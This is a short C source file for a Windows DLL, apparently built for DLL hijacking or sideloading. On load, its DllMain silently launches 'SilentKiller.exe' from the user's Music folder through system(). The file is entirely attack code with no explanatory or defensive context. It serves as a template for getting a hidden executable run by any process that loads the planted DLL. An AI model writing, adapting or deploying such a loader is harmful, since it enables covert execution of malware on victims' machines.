#include <windows.h>

int result()
{
    system("cd %USERPROFILE%\\Music && SilentKiller.exe");
    return 0;
}

BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if(fdwReason == DLL_PROCESS_ATTACH)
    {
        result();
    }
    return TRUE;
}
